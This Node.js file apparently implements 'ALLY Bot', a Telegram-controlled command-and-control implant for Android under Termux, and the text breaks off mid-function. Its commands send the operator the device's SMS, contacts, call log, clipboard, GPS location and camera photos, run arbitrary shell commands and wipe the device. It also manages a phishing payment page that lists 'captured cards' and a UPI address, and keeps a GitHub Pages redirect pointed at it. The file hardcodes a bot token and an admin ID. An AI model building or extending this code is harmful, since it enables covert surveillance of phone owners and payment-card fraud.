#!/usr/bin/env node
'use strict';
// ═══════════════════════════════════════════════════════════════
// ALLY Bot v2.0 — JUGGERNAUT
// Encrypted Telegram C2 — zero npm deps, device-locked config
// Admin: 5700018165 | AES-256-GCM | Long-poll + Watchdog
//
// v2.0 — Complete rewrite. Every command ACKs instantly, edits
//   with result. Send retry 3x. Message chunking. Command
//   aliases. Post-update self-announcement. Stats. Better errors.
//   Exponential backoff. Boot self-test. Smarter watchdog.
//   New: /help /version /alive /proxylog /tunnellog /disk /mem
//        /history /selftest
//
// Admin:   /update /updateproxy /addop /rmop /ops /setgithub
//          /nuke /fixall /history /selftest
// Shared:  /status /url /tunnel /restart /kill /battery /ping
//          /alive /version /health /logs /proxylog /tunnellog
//          /ip /wifi /disk /mem /location /photo /sms /contacts
//          /calllog /clipboard /shell /cards /vpa /redirect /help
// ═══════════════════════════════════════════════════════════════

const https = require('https');
const crypto = require('crypto');
const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');

// ─── Constants ───────────────────────────────────────────────
const VERSION = '2.0';
const BOT_TOKEN = '9217648558:AAGylOMU6NZYBcqNDE3N4ZYp4asHsN4YX0I';
const SUPER_ADMIN = 5700018165;

const SPUD_DIR = path.join(os.homedir(), '.spud');
const CFG_FILE = path.join(SPUD_DIR, 'bot.enc');
const LOG_DIR = path.join(SPUD_DIR, 'logs');
const LOG_FILE = path.join(LOG_DIR, 'bot.log');
const NOTIFY_FILE = path.join(SPUD_DIR, '.update-notify.json');

const HEARTBEAT_MS = 30 * 60 * 1000;
const WATCHDOG_MS = 45 * 1000;
const POLL_TIMEOUT = 30;
const TUNNEL_COOLDOWN = 120000;
const MAX_LOG_SIZE = 256 * 1024;
const NUKE_WINDOW = 30000;
const TG_MSG_LIMIT = 4000;

// ─── Encryption (device-bound, identical to v1/loader.js) ────
function getDeviceKey() {
  const parts = [
    sh('getprop ro.serialno 2>/dev/null'),
    sh('getprop ro.boot.serialno 2>/dev/null'),
    sh('getprop ro.product.model 2>/dev/null'),
    sh('getprop ro.product.brand 2>/dev/null'),
    sh('getprop ro.hardware 2>/dev/null'),
    sh("cat /proc/cpuinfo 2>/dev/null | grep Serial | awk '{print $3}'"),
    sh("settings get secure android_id 2>/dev/null"),
    os.hostname(),
  ].filter(Boolean).join('|');
  return crypto.createHash('sha256').update('ALLY-BOT-' + parts).digest();
}

function encryptCfg(data) {
  const key = getDeviceKey();
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
  const enc = Buffer.concat([cipher.update(JSON.stringify(data), 'utf8'), cipher.final()]);
  const tag = cipher.getAuthTag();
  return Buffer.concat([iv, tag, enc]);
}

function decryptCfg(buf) {
  const key = getDeviceKey();
  const iv = buf.subarray(0, 12);
  const tag = buf.subarray(12, 28);
  const enc = buf.subarray(28);
  const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
  decipher.setAuthTag(tag);
  const dec = Buffer.concat([decipher.update(enc), decipher.final()]);
  return JSON.parse(dec.toString('utf8'));
}

// ─── State ───────────────────────────────────────────────────
let cfg = {
  operators: [],
  deviceId: '',
  lastUrl: null,
  nukeArmed: null,
  startedAt: Date.now(),
  deployedAt: null,
  totalRestarts: 0,
  githubUser: '',
  githubRepo: '',
  githubToken: '',
};

const stats = {
  bootTime: Date.now(),
  cmdsRun: 0,
  cmdsFailed: 0,
  msgsSent: 0,
  msgsRetried: 0,
  pollErrors: 0,
  watchdogFixes: 0,
  lastCmd: null,
};

const cmdLog = [];     // last 50 commands for /history
const CMD_LOG_MAX = 50;

let offset = 0;
let running = true;
let lastTunnelRestart = 0;

// ─── Config persistence (encrypted) ─────────────────────────
function loadCfg() {
  try {
    if (fs.existsSync(CFG_FILE)) {
      const buf = fs.readFileSync(CFG_FILE);
      const saved = decryptCfg(buf);
      cfg = { ...cfg, ...saved, startedAt: Date.now() };
      cfg.totalRestarts = (cfg.totalRestarts || 0) + 1;
    }
  } catch (e) {
    log('cfg load err (new device or first run): ' + e.message);
  }
}

function saveCfg() {
  try {
    fs.mkdirSync(SPUD_DIR, { recursive: true });
    const enc = encryptCfg(cfg);
    fs.writeFileSync(CFG_FILE, enc);
    fs.chmodSync(CFG_FILE, 0o600);
  } catch (e) { log('cfg save err: ' + e.message); }
}

// ─── Logging ─────────────────────────────────────────────────
function log(msg) {
  const ts = new Date().toISOString().slice(0, 19).replace('T', ' ');
  const line = `[${ts}] ${msg}`;
  try { process.stdout.write(line + '\n'); } catch {}
  try {
    fs.mkdirSync(LOG_DIR, { recursive: true });
    try {
      const st = fs.statSync(LOG_FILE);
      if (st.size > MAX_LOG_SIZE) {
        try { fs.unlinkSync(LOG_FILE + '.old'); } catch {}
        fs.renameSync(LOG_FILE, LOG_FILE + '.old');
      }
    } catch {}
    fs.appendFileSync(LOG_FILE, line + '\n');
  } catch {}
}

// ─── Helpers ─────────────────────────────────────────────────
function sh(cmd, timeout = 8000) {
  try {
    return execSync(cmd, { timeout, encoding: 'utf8', stdio: ['pipe', 'pipe', 'pipe'] }).trim();
  } catch { return ''; }
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

function fmtBytes(b) {
  if (!b || isNaN(b)) return '0B';
  if (b < 1024) return b + 'B';
  if (b < 1048576) return (b / 1024).toFixed(1) + 'KB';
  return (b / 1048576).toFixed(1) + 'MB';
}

function fmtDur(ms) {
  const s = Math.floor(ms / 1000);
  if (s < 60) return s + 's';
  if (s < 3600) return Math.floor(s / 60) + 'm ' + (s % 60) + 's';
  const h = Math.floor(s / 3600);
  const m = Math.floor((s % 3600) / 60);
  if (h < 24) return h + 'h ' + m + 'm';
  return Math.floor(h / 24) + 'd ' + (h % 24) + 'h';
}

function esc(s) {
  return String(s || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

// ─── Auth ────────────────────────────────────────────────────
function isSuperAdmin(id) { return id === SUPER_ADMIN; }
function isOperator(id) { return cfg.operators.includes(id); }
function isAuthorized(id) { return isSuperAdmin(id) || isOperator(id); }

// ─── Telegram API ────────────────────────────────────────────
function tg(method, body = {}) {
  return new Promise((resolve) => {
    const data = JSON.stringify(body);
    const timeoutMs = (method === 'getUpdates' ? POLL_TIMEOUT + 15 : 20) * 1000;
    const req = https.request({
      hostname: 'api.telegram.org',
      path: `/bot${BOT_TOKEN}/${method}`,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) },
      timeout: timeoutMs,
    }, (res) => {
      let buf = '';
      res.on('data', c => buf += c);
      res.on('end', () => {
        try { const j = JSON.parse(buf); resolve(j.ok ? j.result : null); }
        catch { resolve(null); }
      });
    });
    req.on('error', () => resolve(null));
    req.on('timeout', () => { req.destroy(); resolve(null); });
    req.write(data);
    req.end();
  });
}

// Send with retry (3 attempts, backoff)
async function send(chatId, text, opts = {}) {
  if (!text) return null;
  const payload = { chat_id: chatId, text, parse_mode: 'HTML', disable_web_page_preview: true, ...opts };
  for (let i = 0; i < 3; i++) {
    const r = await tg('sendMessage', payload);
    if (r) { stats.msgsSent++; return r; }
    if (i < 2) { stats.msgsRetried++; await sleep(1000 * (i + 1)); }
  }
  log('send failed 3x to ' + chatId);
  return null;
}

// Edit previously sent message (for ACK → result pattern)
async function editMsg(chatId, msgId, text) {
  if (!msgId || !text) return null;
  return tg('editMessageText', {
    chat_id: chatId, message_id: msgId, text,
    parse_mode: 'HTML', disable_web_page_preview: true,
  });
}

// Reply helper: edit ACK if exists, otherwise send new
async function reply(chatId, ackId, text) {
  if (ackId) {
    const ok = await editMsg(chatId, ackId, text);
    if (ok) return ok;
  }
  return send(chatId, text);
}

// Send to admin + all operators
async function sendAll(text) {
  const ids = [...new Set([SUPER_ADMIN, ...cfg.operators])];
  for (const id of ids) await send(id, text);
}

// Send long text with auto-chunking
async function sendLong(chatId, text) {
  if (text.length <= TG_MSG_LIMIT) return send(chatId, text);
  let remaining = text;
  while (remaining.length > 0) {
    let chunk;
    if (remaining.length <= TG_MSG_LIMIT) {
      chunk = remaining; remaining = '';
    } else {
      let cut = remaining.lastIndexOf('\n', TG_MSG_LIMIT);
      if (cut < 200) cut = TG_MSG_LIMIT;
      chunk = remaining.slice(0, cut);
      remaining = remaining.slice(cut).trimStart();
    }
    await send(chatId, chunk);
    if (remaining.length) await sleep(300);
  }
}

// Upload photo via multipart
async function sendPhoto(chatId, filePath) {
  try {
    const imgBuf = fs.readFileSync(filePath);
    const boundary = '----BotForm' + Date.now();
    const body = Buffer.concat([
      Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${chatId}\r\n`),
      Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="photo"; filename="photo.jpg"\r\nContent-Type: image/jpeg\r\n\r\n`),
      imgBuf,
      Buffer.from(`\r\n--${boundary}--\r\n`),
    ]);
    return new Promise((resolve) => {
      const req = https.request({
        hostname: 'api.telegram.org',
        path: `/bot${BOT_TOKEN}/sendPhoto`,
        method: 'POST',
        headers: { 'Content-Type': `multipart/form-data; boundary=${boundary}`, 'Content-Length': body.length },
        timeout: 30000,
      }, (res) => {
        let d = ''; res.on('data', c => d += c);
        res.on('end', () => resolve(true));
      });
      req.on('error', () => resolve(false));
      req.on('timeout', () => { req.destroy(); resolve(false); });
      req.write(body);
      req.end();
    });
  } catch (e) { log('sendPhoto err: ' + e.message); return false; }
}

// ─── System queries ──────────────────────────────────────────
function getTunnelUrl() {
  // Method 1: tunnel log file
  const logPath = path.join(LOG_DIR, 'tunnel.log');
  try {
    const data = fs.readFileSync(logPath, 'utf8');
    const m = data.match(/https:\/\/[a-z0-9-]+\.trycloudflare\.com/g);
    if (m && m.length) return m[m.length - 1];
  } catch {}
  // Method 2: spud.sh url
  const url = sh('bash ~/spud.sh url 2>/dev/null');
  if (url && url.startsWith('http')) return url;
  // Method 3: tmux pane scrape
  const pane = sh("tmux capture-pane -t spud-tunnel -p 2>/dev/null | grep -oE 'https://[a-z0-9-]+\\.trycloudflare\\.com' | tail -1");
  if (pane && pane.startsWith('http')) return pane;
  return null;
}

function getBattery() {
  const raw = sh('termux-battery-status 2>/dev/null', 10000);
  try {
    const b = JSON.parse(raw || '{}');
    return { pct: b.percentage ?? -1, status: b.status || 'unknown', temp: b.temperature || 0 };
  } catch { return { pct: -1, status: 'unavailable', temp: 0 }; }
}

function getDeviceIp() {
  const wlan = sh("ip addr show wlan0 2>/dev/null | grep -oP 'inet \\K[0-9.]+'");
  return wlan || sh("ip route 2>/dev/null | grep src | head -1 | grep -oP 'src \\K[0-9.]+'") || '?';
}

function svcStatus(name) {
  return sh(`tmux has-session -t ${name} 2>&1; echo $?`) === '0';
}

// ─── GitHub Pages redirect ───────────────────────────────────
async function updateGitHubRedirect(tunnelUrl) {
  if (!cfg.githubUser || !cfg.githubRepo || !cfg.githubToken) return false;
  try {
    const apiBase = 'api.github.com';
    const repoPath = `/repos/${cfg.githubUser}/${cfg.githubRepo}/contents/index.html`;

    // Get current file SHA
    const current = await new Promise((resolve, reject) => {
      const req = https.request({
        hostname: apiBase, path: repoPath, method: 'GET',
        headers: {
          'Authorization': `token ${cfg.githubToken}`,
          'User-Agent': 'ally-bot/2.0',
          'Accept': 'application/vnd.github.v3+json',
        },
      }, res => {
        let d = ''; res.on('data', c => d += c);
        res.on('end', () => { try { resolve(JSON.parse(d)); } catch { resolve(null); } });
      });
      req.on('error', reject);
      req.end();
    });

    const sha = current && current.sha ? current.sha : null;
    if (!sha) { log('github: no file SHA'); return false; }

    const oldContent = Buffer.from(current.content, 'base64').toString('utf8');
    let newContent = oldContent.replace(/https:\/\/[a-z0-9-]+\.trycloudflare\.com/g, tunnelUrl);
    // Fix: strip pathname/search/hash append — GH Pages path breaks tunnel redirect
    newContent = newContent.replace(/window\.location\.replace\(T\s*\+\s*window\.location\.[^)]+\)/g, 'window.location.replace(T)');

    if (newContent === oldContent) { log('github: URL already current'); return true; }

    const body = JSON.stringify({
      message: `url-sync → ${tunnelUrl.slice(0, 45)}`,
      content: Buffer.from(newContent).toString('base64'),
      sha,
    });

    const ok = await new Promise((resolve, reject) => {
      const req = https.request({
        hostname: apiBase, path: repoPath, method: 'PUT',
        headers: {
          'Authorization': `token ${cfg.githubToken}`,
          'User-Agent': 'ally-bot/2.0',
          'Accept': 'application/vnd.github.v3+json',
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(body),
        },
      }, res => {
        let d = ''; res.on('data', c => d += c);
        res.on('end', () => {
          if (res.statusCode >= 200 && res.statusCode < 300) {
            log('github: redirect updated → ' + tunnelUrl);
            resolve(true);
          } else {
            log('github: update fail ' + res.statusCode + ' ' + d.slice(0, 200));
            resolve(false);
          }
        });
      });
      req.on('error', reject);
      req.write(body);
      req.end();
    });
    return ok;
  } catch (e) {
    log('github err: ' + e.message);
    return false;
  }
}

// ═══════════════════════════════════════════════════════════════
// COMMAND HANDLERS
// Each: async (chatId, args, msg, ackId)
//   ackId = message_id of ACK msg (if slow cmd), null if fast
// ═══════════════════════════════════════════════════════════════

async function cmdStart(chatId, args, msg, ackId) {
  const role = isSuperAdmin(chatId) ? '👑 Admin' : '🔧 Operator';
  await send(chatId, [
    `<b>ALLY Bot v${VERSION} — JUGGERNAUT</b>`,
    ``,
    `You: <code>${chatId}</code> (${role})`,
    `Device: <b>${cfg.deviceId}</b>`,
    `Uptime: ${fmtDur(Date.now() - stats.bootTime)}`,
    `Commands run: ${stats.cmdsRun}`,
    ``,
    `Type /help for all commands.`,
  ].join('\n'));
}

async function cmdHelp(chatId, args, msg, ackId) {
  const adm = isSuperAdmin(chatId);
  const lines = [
    `<b>ALLY v${VERSION} — Commands</b>`,
    ``,
    `<b>── Status ──</b>`,
    `/status <i>(/s)</i> — Full status`,
    `/url <i>(/u)</i> — Tunnel URL`,
    `/ping — Alive + timestamp`,
    `/alive — Ultra-simple ping`,
    `/version <i>(/v)</i> — Version + stats`,
    `/health <i>(/hc)</i> — External health check`,
    `/battery <i>(/bat)</i> — Battery level`,
    `/ip — Device IP`,
    `/wifi — WiFi details`,
    `/disk — Storage usage`,
    `/mem — Memory usage`,
    ``,
    `<b>── Services ──</b>`,
    `/tunnel — Restart tunnel`,
    `/restart — Restart all services`,
    `/kill — Stop all services`,
    `/fixall — Full recovery <i>(admin)</i>`,
    ``,
    `<b>── Logs ──</b>`,
    `/logs <i>(/log)</i> — Bot log (30 lines)`,
    `/proxylog <i>(/plog)</i> — Proxy log`,
    `/tunnellog <i>(/tlog)</i> — Tunnel log`,
    ``,
    `<b>── Device ──</b>`,
    `/location <i>(/loc)</i> — GPS + map link`,
    `/photo <i>[0|1]</i> — Camera snap`,
    `/sms — Last 10 SMS`,
    `/contacts — Contacts (30)`,
    `/calllog — Call log (15)`,
    `/clipboard — Clipboard text`,
    `/shell <i>&lt;cmd&gt;</i> — Run command`,
    ``,
    `<b>── Business ──</b>`,
    `/cards — Captured cards`,
    `/vpa <i>[new]</i> — Show/change VPA`,
    `/redirect — GitHub redirect URL`,
  ];
  if (adm) {
    lines.push(
      ``,
      `<b>── Admin Only ──</b>`,
      `/update <i>&lt;url&gt;</i> — OTA bot update`,
      `/updateproxy <i>&lt;url&gt;</i> — OTA proxy update`,
      `/addop <i>&lt;id&gt;</i> — Add operator`,
      `/rmop <i>&lt;id&gt;</i> — Remove operator`,
      `/ops — List operators`,
      `/setgithub <i>&lt;u/r token&gt;</i> — GitHub config`,
      `/history — Last 20 commands`,
      `/selftest — Full system check`,
      `/nuke — Wipe device (double-tap)`,
    );
  }
  await sendLong(chatId, lines.join('\n'));
}

async function cmdStatus(chatId, args, msg, ackId) {
  const uptime = sh('uptime -p 2>/dev/null') || sh('uptime 2>/dev/null') || '?';
  const disk = sh("df -h ~ 2>/dev/null | tail -1 | awk '{print $4\" / \"$2}'") || '?';
  const mem = sh("free -h 2>/dev/null | grep Mem | awk '{print $3\" / \"$2}'") || '?';
  const batt = getBattery();
  const ip = getDeviceIp();
  const url = getTunnelUrl();
  const proxyUp = svcStatus('spud-proxy');
  const tunnelUp = svcStatus('spud-tunnel');
  const node = sh('node -v 2>/dev/null') || '?';
  const botAge = fmtDur(Date.now() - stats.bootTime);
  const battIcon = batt.pct > 50 ? '🔋' : batt.pct > 15 ? '🪫' : batt.pct >= 0 ? '🔴' : '❓';

  const text = [
    `<b>📡 ALLY v${VERSION} — ${cfg.deviceId || '?'}</b>`,
    ``,
    `<b>IP:</b> <code>${ip}</code>`,
    `<b>Uptime:</b> ${uptime}`,
    `<b>Battery:</b> ${battIcon} ${batt.pct >= 0 ? batt.pct + '%' : 'N/A'} (${batt.status}${batt.temp > 0 ? ', ' + batt.temp + '°C' : ''})`,
    `<b>Disk:</b> ${disk}  <b>Mem:</b> ${mem}`,
    `<b>Node:</b> ${node}`,
    ``,
    `<b>Services:</b>`,
    `  Proxy:  ${proxyUp ? '🟢 UP' : '🔴 DOWN'}`,
    `  Tunnel: ${tunnelUp ? '🟢 UP' : '🔴 DOWN'}`,
    `  Bot:    🟢 UP (${botAge})`,
    ``,
    url ? `<b>URL:</b> <code>${url}</code>` : '<b>URL:</b> ❌ none',
    ``,
    `<b>Stats:</b> ${stats.cmdsRun} cmds | ${stats.cmdsFailed} err | ${stats.watchdogFixes} wd-fix`,
    `<b>Restarts:</b> ${cfg.totalRestarts} | <b>Ops:</b> ${cfg.operators.length}`,
  ].join('\n');

  await reply(chatId, ackId, text);
}

async function cmdUrl(chatId, args, msg, ackId) {
  const url = getTunnelUrl();
  if (url) {
    cfg.lastUrl = url; saveCfg();
    await send(chatId, [
      `🔗 <code>${url}</code>`,
      ``,
      `💳 <code>${url}/_payment?amount=499</code>`,
      cfg.githubUser ? `📄 <code>https://${cfg.githubUser}.github.io/${cfg.githubRepo}</code>` : '',
    ].filter(Boolean).join('\n'));
  } else {
    await send(chatId, '❌ No tunnel URL. Try /tunnel to restart.');
  }
}

async function cmdPing(chatId) {
  await send(chatId, `🏓 <b>PONG</b> — ${new Date().toISOString().slice(0, 19)} — ${cfg.deviceId}\nv${VERSION} | up ${fmtDur(Date.now() - stats.bootTime)} | ${stats.cmdsRun} cmds`);
}

async function cmdAlive(chatId) {
  await send(chatId, `✅ alive v${VERSION}`);
}

async function cmdVersion(chatId) {
  const uptime = fmtDur(Date.now() - stats.bootTime);
  const memUsage = process.memoryUsage();
  const heapMB = (memUsage.heapUsed / 1048576).toFixed(1);
  const rssMB = (memUsage.rss / 1048576).toFixed(1);
  await send(chatId, [
    `<b>ALLY Bot v${VERSION} — JUGGERNAUT</b>`,
    ``,
    `<b>Uptime:</b> ${uptime}`,
    `<b>Commands:</b> ${stats.cmdsRun} run, ${stats.cmdsFailed} failed`,
    `<b>Messages:</b> ${stats.msgsSent} sent, ${stats.msgsRetried} retried`,
    `<b>Watchdog:</b> ${stats.watchdogFixes} fixes`,
    `<b>Poll errors:</b> ${stats.pollErrors}`,
    `<b>Memory:</b> ${heapMB}MB heap, ${rssMB}MB RSS`,
    `<b>Restarts:</b> ${cfg.totalRestarts}`,
    `<b>Node:</b> ${process.version}`,
    `<b>PID:</b> ${process.pid}`,
    stats.lastCmd ? `\n<b>Last cmd:</b> ${stats.lastCmd.cmd} (${stats.lastCmd.ms}ms ago)` : '',
  ].filter(Boolean).join('\n'));
}

async function cmdHealth(chatId, args, msg, ackId) {
  const url = getTunnelUrl();
  if (!url) return reply(chatId, ackId, '❌ No tunnel URL — nothing to check.');
  const localHP = sh('curl -s -o /dev/null -w "%{http_code}" --max-time 5 http://localhost:3000/_health 2>/dev/null', 8000);
  const extHP = sh(`curl -s -o /dev/null -w "%{http_code}" --max-time 10 "${url}/_health" 2>/dev/null`, 15000);
  const localOk = localHP === '200';
  const extOk = extHP === '200';
  await reply(chatId, ackId, [
    `<b>🏥 Health Check</b>`,
    ``,
    `Local (localhost:3000): ${localOk ? '🟢' : '🔴'} ${localHP || 'timeout'}`,
    `External (tunnel):     ${extOk ? '🟢' : '🔴'} ${extHP || 'timeout'}`,
    ``,
    `URL: <code>${url}</code>`,
    !localOk ? '\n⚠️ Proxy may be down — try /restart' : '',
    localOk && !extOk ? '\n⚠️ Tunnel may be down — try /tunnel' : '',
    localOk && extOk ? '\n✅ All good.' : '',
  ].filter(Boolean).join('\n'));
}

async function cmdBattery(chatId) {
  const b = getBattery();
  if (b.pct < 0) return send(chatId, '⚠️ Battery info unavailable — check Termux:API permission.');
  const icon = b.pct > 50 ? '🔋' : b.pct > 15 ? '🪫' : '🔴';
  await send(chatId, `${icon} <b>${b.pct}%</b> — ${b.status}${b.temp > 0 ? ' (' + b.temp + '°C)' : ''}`);
}

async function cmdIp(chatId) {
  await send(chatId, `<b>IP:</b> <code>${getDeviceIp()}</code>`);
}

async function cmdWifi(chatId) {
  const raw = sh('termux-wifi-connectioninfo 2>/dev/null', 10000);
  try {
    const w = JSON.parse(raw);
    await send(chatId, [
      `📶 <b>WiFi</b>`,
      `<b>SSID:</b> ${w.ssid || '?'}`,
      `<b>BSSID:</b> <code>${w.bssid || '?'}</code>`,
      `<b>IP:</b> <code>${w.ip || '?'}</code>`,
      `<b>Signal:</b> ${w.rssi || '?'} dBm`,
      `<b>Speed:</b> ${w.link_speed || '?'} Mbps`,
      `<b>Freq:</b> ${w.frequency || '?'} MHz`,
    ].join('\n'));
  } catch {
    await send(chatId, '⚠️ WiFi info unavailable.' + (raw ? '\n<pre>' + esc(raw.slice(0, 200)) + '</pre>' : ''));
  }
}

async function cmdDisk(chatId) {
  const raw = sh('df -h 2>/dev/null | head -10');
  if (raw) {
    await send(chatId, `💾 <b>Disk</b>\n<pre>${esc(raw)}</pre>`);
  } else {
    await send(chatId, '⚠️ Disk info unavailable.');
  }
}

async function cmdMem(chatId) {
  const raw = sh('free -h 2>/dev/null');
  const botMem = process.memoryUsage();
  const heapMB = (botMem.heapUsed / 1048576).toFixed(1);
  const lines = [`🧠 <b>Memory</b>`];
  if (raw) lines.push(`<pre>${esc(raw)}</pre>`);
  lines.push(`\n<b>Bot heap:</b> ${heapMB}MB`);
  await send(chatId, lines.join('\n'));
}

// ─── Service commands ────────────────────────────────────────

async function cmdTunnel(chatId, args, msg, ackId) {
  if (Date.now() - lastTunnelRestart < TUNNEL_COOLDOWN) {
    const wait = Math.ceil((TUNNEL_COOLDOWN - (Date.now() - lastTunnelRestart)) / 1000);
    return reply(chatId, ackId, `⏳ Cooldown — try again in ${wait}s`);
  }
  lastTunnelRestart = Date.now();
  log('Tunnel restart by ' + chatId);

  await reply(chatId, ackId, '🔄 [1/3] Killing old tunnel...');
  sh('tmux kill-session -t spud-tunnel 2>/dev/null');
  sh('pkill -f cloudflared 2>/dev/null');
  await sleep(2000);

  if (ackId) await editMsg(chatId, ackId, '🔄 [2/3] Starting new tunnel...');
  sh('tmux new-session -d -s spud-tunnel "cloudflared tunnel --url http://localhost:3000 2>&1 | tee ~/.spud/logs/tunnel.log"');

  if (ackId) await editMsg(chatId, ackId, '🔄 [3/3] Waiting for URL...');
  let newUrl = null;
  for (let i = 0; i < 15; i++) {
    await sleep(3000);
    newUrl = getTunnelUrl();
    if (newUrl) break;
  }

  if (newUrl) {
    const changed = newUrl !== cfg.lastUrl;
    cfg.lastUrl = newUrl; saveCfg();
    const result = [
      `✅ <b>Tunnel restarted</b>${changed ? ' (new URL)' : ''}`,
      ``,
      `🔗 <code>${newUrl}</code>`,
      `💳 <code>${newUrl}/_payment?amount=499</code>`,
    ].join('\n');
    if (ackId) await editMsg(chatId, ackId, result);
    // Notify all operators too
    for (const op of cfg.operators) { if (op !== chatId) await send(op, result); }
    if (changed) await updateGitHubRedirect(newUrl);
  } else {
    await reply(chatId, ackId, '⚠️ Tunnel started — URL not ready yet. Try /url in 30s.');
  }
}

async function cmdRestart(chatId, args, msg, ackId) {
  log('Full restart by ' + chatId);
  await reply(chatId, ackId, '🔄 [1/3] Stopping services...');
  sh('bash ~/spud.sh stop 2>/dev/null', 15000);
  await sleep(2000);

  if (ackId) await editMsg(chatId, ackId, '🔄 [2/3] Starting services...');
  sh('bash ~/spud.sh start 2>/dev/null', 15000);
  await sleep(5000);

  if (ackId) await editMsg(chatId, ackId, '🔄 [3/3] Verifying...');
  await sleep(3000);
  const url = getTunnelUrl();
  const proxyUp = svcStatus('spud-proxy');
  const tunnelUp = svcStatus('spud-tunnel');
  if (url) { cfg.lastUrl = url; saveCfg(); }

  const result = [
    `✅ <b>Services restarted</b>`,
    ``,
    `Proxy:  ${proxyUp ? '🟢 UP' : '🔴 DOWN'}`,
    `Tunnel: ${tunnelUp ? '🟢 UP' : '🔴 DOWN'}`,
    url ? `🔗 <code>${url}</code>` : '⏳ URL pending...',
  ].join('\n');

  await reply(chatId, ackId, result);
  // Notify others
  for (const op of cfg.operators) { if (op !== chatId) await send(op, result); }
  if (url && url !== cfg.lastUrl) await updateGitHubRedirect(url);
}

async function cmdKill(chatId, args, msg, ackId) {
  log('Kill by ' + chatId);
  sh('bash ~/spud.sh stop 2>/dev/null', 10000);
  sh('pkill -f cloudflared 2>/dev/null');
  sh('tmux kill-session -t spud-proxy 2>/dev/null');
  sh('tmux kill-session -t spud-tunnel 2>/dev/null');
  await reply(chatId, ackId, '💀 All services killed. Bot still alive.\nUse /restart to bring them back.');
  for (const op of cfg.operators) { if (op !== chatId) await send(op, '💀 Services killed by admin.'); }
}

async function cmdFixAll(chatId, args, msg, ackId) {
  log('Fixall by ' + chatId);
  await reply(chatId, ackId, '🔧 [1/4] Killing stale processes...');
  sh('pkill -f cloudflared 2>/dev/null; pkill -f "node.*loader" 2>/dev/null', 5000);
  await sleep(2000);

  if (ackId) await editMsg(chatId, ackId, '🔧 [2/4] Running spud.sh ensure...');
  const result = sh('bash ~/spud.sh ensure 2>&1', 30000);
  await sleep(5000);

  if (ackId) await editMsg(chatId, ackId, '🔧 [3/4] Checking services...');
  const url = getTunnelUrl();
  const proxyUp = svcStatus('spud-proxy');
  const tunnelUp = svcStatus('spud-tunnel');

  if (ackId) await editMsg(chatId, ackId, '🔧 [4/4] Updating redirect...');
  if (url && url !== cfg.lastUrl) {
    cfg.lastUrl = url; saveCfg();
    await updateGitHubRedirect(url);
  }

  await reply(chatId, ackId, [
    `✅ <b>Recovery complete</b>`,
    ``,
    `Proxy:  ${proxyUp ? '🟢' : '🔴'}`,
    `Tunnel: ${tunnelUp ? '🟢' : '🔴'}`,
    url ? `🔗 <code>${url}</code>` : '⏳ URL pending',
    result ? `\n<pre>${esc(result.slice(0, 500))}</pre>` : '',
  ].filter(Boolean).join('\n'));
}

// ─── Log commands ────────────────────────────────────────────

async function cmdLogs(chatId, args) {
  const n = parseInt(args) || 30;
  try {
    const lines = fs.readFileSync(LOG_FILE, 'utf8').split('\n').filter(Boolean).slice(-n).join('\n');
    await sendLong(chatId, `<pre>${esc(lines || 'empty')}</pre>`);
  } catch { await send(chatId, '📋 No bot logs found.'); }
}

async function cmdProxyLog(chatId, args) {
  const n = parseInt(args) || 30;
  const raw = sh(`tmux capture-pane -t spud-proxy -p 2>/dev/null | tail -${n}`);
  if (raw) {
    await sendLong(chatId, `<b>Proxy log (last ${n}):</b>\n<pre>${esc(raw)}</pre>`);
  } else {
    // Fallback: check log file
    const logFile = path.join(LOG_DIR, 'proxy.log');
    try {
      const lines = fs.readFileSync(logFile, 'utf8').split('\n').filter(Boolean).slice(-n).join('\n');
      await sendLong(chatId, `<b>Proxy log (last ${n}):</b>\n<pre>${esc(lines)}</pre>`);
    } catch {
      await send(chatId, '📋 No proxy logs. Proxy may not be running — try /restart');
    }
  }
}

async function cmdTunnelLog(chatId, args) {
  const n = parseInt(args) || 30;
  const logFile = path.join(LOG_DIR, 'tunnel.log');
  try {
    const lines = fs.readFileSync(logFile, 'utf8').split('\n').filter(Boolean).slice(-n).join('\n');
    await sendLong(chatId, `<b>Tunnel log (last ${n}):</b>\n<pre>${esc(lines)}</pre>`);
  } catch {
    const raw = sh(`tmux capture-pane -t spud-tunnel -p 2>/dev/null | tail -${n}`);
    if (raw) {
      await sendLong(chatId, `<b>Tunnel log (last ${n}):</b>\n<pre>${esc(raw)}</pre>`);
    } else {
      await send(chatId, '📋 No tunnel logs. Tunnel may not be running — try /tunnel');
    }
  }
}

// ─── Device commands ─────────────────────────────────────────

async function cmdLocation(chatId, args, msg, ackId) {
  const raw = sh('termux-location -p gps 2>/dev/null || termux-location -p network 2>/dev/null', 45000);
  try {
    const loc = JSON.parse(raw);
    if (!loc.latitude) throw new Error('no lat');
    const gmaps = `https://maps.google.com/maps?q=${loc.latitude},${loc.longitude}`;
    await reply(chatId, ackId, [
      `📍 <b>Location</b>`,
      `<b>Lat:</b> <code>${loc.latitude}</code>`,
      `<b>Lon:</b> <code>${loc.longitude}</code>`,
      `<b>Accuracy:</b> ${loc.accuracy || '?'}m`,
      `<b>Provider:</b> ${loc.provider || '?'}`,
      ``,
      `🗺 <a href="${gmaps}">Open in Maps</a>`,
    ].join('\n'));
  } catch {
    await reply(chatId, ackId, '⚠️ Location failed. Check Termux:API location permission.\n' +
      (raw ? '<pre>' + esc(raw.slice(0, 200)) + '</pre>' : ''));
  }
}

async function cmdPhoto(chatId, args, msg, ackId) {
  const camId = (args || '0').trim();
  const fpath = path.join(SPUD_DIR, 'data', `cam_${Date.now()}.jpg`);
  sh(`mkdir -p "${path.dirname(fpath)}"`, 3000);
  sh(`termux-camera-photo -c ${camId} "${fpath}" 2>/dev/null`, 15000);
  if (fs.existsSync(fpath)) {
    const ok = await sendPhoto(chatId, fpath);
    try { fs.unlinkSync(fpath); } catch {}
    if (!ok) await reply(chatId, ackId, '⚠️ Photo captured but upload failed.');
    else if (ackId) await editMsg(chatId, ackId, `📸 Camera ${camId} — sent.`);
